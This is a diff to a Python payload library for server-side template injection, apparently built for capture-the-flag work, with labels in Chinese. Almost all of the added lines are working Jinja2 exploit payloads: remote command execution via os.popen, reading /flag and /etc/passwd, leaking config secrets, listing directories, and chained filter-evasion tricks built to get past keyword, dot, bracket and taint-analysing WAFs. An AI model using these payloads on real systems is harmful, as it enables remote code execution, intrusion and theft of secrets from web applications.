@@ -83,7 +83,7 @@ DETECTION: Dict[str, List[str]] = {
 EXPLOIT: Dict[str, List[Dict[str, str]]] = {
     "Jinja2 (Flask)": [
         {
-            "name": "RCE - subprocess.Popen (最常用)",
+            "name": "RCE - subprocess.Popen (最常用, 无WAF)",
             "payload": "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
         },
         {
@@ -92,7 +92,7 @@ EXPLOIT: Dict[str, List[Dict[str, str]]] = {
             "note": "X 需要替换为 subprocess.Popen 的索引, 用搜索功能查找",
         },
         {
-            "name": "RCE - lipsum 方式",
+            "name": "RCE - lipsum 方式 (无WAF)",
             "payload": "{{ lipsum.__globals__['os'].popen('id').read() }}",
         },
         {
@@ -104,15 +104,20 @@ EXPLOIT: Dict[str, List[Dict[str, str]]] = {
             "payload": "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
         },
         {
-            "name": "文件读取 - open",
+            "name": "RCE - joiner 方式 (备用)",
+            "payload": "{{ joiner.__init__.__globals__.os.popen('id').read() }}",
+        },
+        {
+            "name": "★ 文件读取 - builtins.open (绕过 popen 禁用)",
+            "payload": "{{ lipsum.__globals__.__builtins__.open('/flag').read() }}",
+            "note": "无需 popen, 直接 open 读文件 — 适用 popen 被WAF/沙箱禁用时",
+        },
+        {
+            "name": "文件读取 - get_flashed_messages",
             "payload": "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}",
         },
         {
-            "name": "文件读取 - lipsum",
-            "payload": "{{ lipsum.__globals__.__builtins__.open('/flag').read() }}",
-        },
-        {
-            "name": "信息泄露 - config",
+            "name": "信息泄露 - config (SECRET_KEY等)",
             "payload": "{{ config }}",
         },
         {
@@ -130,12 +135,27 @@ EXPLOIT: Dict[str, List[Dict[str, str]]] = {
             "note": "需要传参 ?f=/flag",
         },
         {
-            "name": "Bypass 过滤 - 字符串拼接",
+            "name": "Bypass - 字符串拼接 (+)",
             "payload": "{{ ()|attr('__cla'+'ss__')|attr('__bas'+'e__') }}",
         },
         {
-            "name": "Bypass 过滤 - 十六进制",
+            "name": "★ Bypass - 字符串拼接 (~) Jinja2 专用",
+            "payload": "{{ lipsum|attr('__glo'~'bals__') }}",
+            "note": "★ Blank Check 实战验证: ~ 运算符绕过关键字黑名单 (如 __globals__)",
+        },
+        {
+            "name": "★ Bypass - 三合一完整链 (点→attr, 关键字→~拼接, []→__getitem__)",
+            "payload": "{{lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('open')('/flag')|attr('read')()}}",
+            "note": "★ Blank Check 完整攻击链: 绕过点号 + __globals__关键字 + 方括号 三重WAF",
+        },
+        {
+            "name": "Bypass - 十六进制",
             "payload": "{{ ()['\\x5f\\x5fclass\\x5f\\x5f'] }}",
+        },
+        {
+            "name": "★ 文件列表 - __import__ 动态导入",
+            "payload": "{{lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__imp'~'ort__')('os')|attr('listdir')('/')}}",
+            "note": "当 os 被拦截时通过 __import__ 动态加载",
         },
     ],
     "Twig (PHP/Symfony)": [
@@ -248,11 +268,125 @@ BYPASS_FILTERS: Dict[str, List[str]] = {
         "()|attr('__class__')        — attr",
         "().__class__                — 点号",
     ],
-    "关键字过滤绕过": [
-        "eval → lip.sum.__globals__['__builtins__']['ev'+'al']",
-        "import → __builtins__['__imp'+'ort__']",
-        "popen → ...os['po'+'pen']",
-        "class → __dict__['__cla'+'ss__']",
+    "关键字过滤绕过 (字符串拼接)": [
+        "__globals__ → '__glo'~'bals__'          — Jinja2 ~ 运算符拼接 (★实战验证)",
+        "__subclasses__ → '__subcl'~'asses__'    — 同理",
+        "popen → 'po'~'pen'                      — 同理",
+        "__import__ → '__imp'~'ort__'            — 同理",
+        "eval → __builtins__['ev'+'al']           — + 拼接",
+        "class → __dict__['__cla'+'ss__']         — + 拼接",
+    ],
+    "组合多级 WAF 绕过 (★ Blank Check 实战验证)": [
+        "点 -> |attr()    |  关键字 -> ~ 拼接   |  方括号 -> |attr('__getitem__')",
+        "完整链: lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('open')('/flag')|attr('read')()",
+        "文件读取: builtins.open() 替代 popen (当 popen/system 被禁时)",
+        "模块导入: __builtins__['__imp'~'ort__']('os') 动态导入绕过",
+    ],
+    "Enterpris WAF bypass (★ Template Factory 实战 — taint-aware WAF)": [
+        # 背景: WAF 对模板做 taint analysis, 能检测字符级构建的最终结果
+        # 策略: 利用未过滤对象的方法/filter 间接访问
+        "|list|last 索引: request.environ.values()|list|last → werkzeug.request 对象 (绕过 bracket)",
+        "{{% for %}} environ 迭代: 枚举 WSGI environ 所有 key-value, 发现隐藏对象",
+        "select/reject/map 等 generator filter: ALL 可用, WAF 只过滤特定 filter name",
+        "replace 步进式构建: a|replace('0','c')|replace('1','o')... → 逐字构建 keyword",
+        "|items filter 替代 .items(): dict|items → 可迭代 key-value pairs",
+        "lipsum()|list[idx] 字符提取: (lipsum(n)|list)[5] → 提取单个字符",
+        "namespace 对象暂存: ns=namespace(x=obj) → 存储禁止渲染的对象引用",
+        "{% set %} 多步链: 每步单独 {%set%} 再后续使用, 降低单步可疑度",
+        "cycler 生成器利用: cycler.next()/reset()/current 访问状态化对象",
+        "|int/|string/|float 类型转换: 基础类型转换 filter 均可用",
+        "BytesIO access: wr.stream → 文件类对象, getvalue() 方法可用",
+    ],
+}
+
+
+# ═══════════════════════════════════════════════════════════
+#  WAF 绕过链 — 已验证的完整多级绕过 Payload
+# ═══════════════════════════════════════════════════════════
+
+WAF_BYPASS_CHAINS: Dict[str, List[Dict[str, str]]] = {
+    "点号 + 关键字 + 方括号 三重绕过 (Jinja2)": [
+        {
+            "name": "文件读取 — builtins.open (绕过 popen 禁用)",
+            "payload": "{{lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('open')('/flag')|attr('read')()}}",
+            "note": "★ Blank Check 验证: 点→attr, 关键字→~拼接, 方括号→__getitem__)",
+        },
+        {
+            "name": "文件列表 — os.listdir",
+            "payload": "{{lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__imp'~'ort__')('os')|attr('listdir')('/')}}",
+            "note": "当直接访问 os 被拦时的替代方案",
+        },
+        {
+            "name": "命令执行 — __import__ + popen",
+            "payload": "{{lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__imp'~'ort__')('os')|attr('po'~'pen')('cat /flag')|attr('read')()}}",
+            "note": "popen 也被黑名单时需进一步拼接",
+        },
+        {
+            "name": "文件读取 — exec + open (无 popen)",
+            "payload": "{{lipsum|attr('__glo'~'bals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('exec')('print(open(\"/flag\").read())')}}",
+            "note": "当 popen 和直接 open 都被拦时的替代",
+        },
+    ],
+    "attr() 全链绕过 (仅绕过点号)": [
+        {
+            "name": "config 泄露",
+            "payload": "{{config}}",
+            "note": "部分 WAF 不过滤{{}} — 直接获取 SECRET_KEY",
+        },
+        {
+            "name": "__class__ 链 via attr",
+            "payload": "{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subcl'~'asses__')()}}",
+            "note": "完整 object → subclasses 链, 使用 ~ 绕过 subclasses 黑名单",
+        },
+        {
+            "name": "cycler RCE (无 WAF)",
+            "payload": "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}",
+            "note": "无 WAF 时的最简单 payload",
+        },
+        {
+            "name": "namespace RCE (无 WAF)",
+            "payload": "{{namespace.__init__.__globals__.os.popen('cat /flag').read()}}",
+            "note": "备用 payload, cycler 可能被禁",
+        },
+    ],
+    "request.args 绕过 (通过 URL 参数传递黑名单词)": [
+        {
+            "name": "属性名通过 GET 参数",
+            "payload": "{{''|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)()}}&a=__class__&b=__base__&c=__subclasses__",
+            "note": "当 payload 中的关键字被后端/前端 WAF 检测时使用",
+        },
+    ],
+    "enterpris WAF — 步进式 replace 构建 (★ Template Factory)": [
+        {
+            "name": "config 绕过 — replace 步进",
+            "payload": "{%set a='ABCDEF'%}{%set a=a|replace('A','c')|replace('B','o')|replace('C','n')|replace('D','f')|replace('E','i')|replace('F','g')%}{{a}}",
+            "note": "WAF 做 taint analysis 时, step-by-step replace 可能被分析, 但可尝试用 cycler/random 打乱",
+        },
+        {
+            "name": "environ 遍历 — 发现 werkzeug.request",
+            "payload": "{%for k in request.environ%}{{k}}|{%endfor%}",
+            "note": "枚举所有 WSGI environ key, 发现 werkzeug.request / wsgi.input / wsgi.errors",
+        },
+        {
+            "name": "werkzeug.request 捕获 — |list|last 索引",
+            "payload": "{%set wr=request.environ.values()|list|last%}{{wr.path}}",
+            "note": "通过 values() → list → last 获取最后一个值 (werkzeug.request), 避免 bracket 触发 WAF",
+        },
+        {
+            "name": "BytesIO stream 访问",
+            "payload": "{%set wr=request.environ.values()|list|last%}{{wr.stream}}",
+            "note": "Request.stream 是 BytesIO, 可访问 getvalue() 等方法",
+        },
+        {
+            "name": "wsgi.input 捕获 (BufferedReader)",
+            "payload": "{%set inp=request.environ.values()|list%}{{inp[2]}}",
+            "note": "wsgi.input 在 values list 的 index 2, 是 _io.BufferedReader",
+        },
+        {
+            "name": "lipsum 字符提取",
+            "payload": "{{(lipsum()|list)[5]}}",
+            "note": "从 lipsum 输出中提取单个字符 (注意每次调用输出不同, 位置不固定)",
+        },
     ],
 }
 
@@ -276,13 +410,22 @@ def get_bypass() -> dict:
     return BYPASS_FILTERS
 
 
+def get_waf_bypass_chains() -> dict:
+    """获取已验证的 WAF 绕过链 (多级组合绕过)."""
+    return WAF_BYPASS_CHAINS
+
+
 def search_payload(keyword: str) -> list:
-    """在所有 Payload 中搜索关键字."""
+    """在所有 Payload 中搜索关键字 (包括 EXPLOIT 和 WAF_BYPASS_CHAINS)."""
     results = []
     for engine, payloads in EXPLOIT.items():
         for p in payloads:
             if keyword.lower() in p["payload"].lower() or keyword.lower() in p.get("note", "").lower():
-                results.append({"engine": engine, **p})
+                results.append({"source": "exploit", "engine": engine, **p})
+    for chain_name, payloads in WAF_BYPASS_CHAINS.items():
+        for p in payloads:
+            if keyword.lower() in p["payload"].lower() or keyword.lower() in p.get("note", "").lower():
+                results.append({"source": "waf_bypass", "chain": chain_name, **p})
     return results
 
 
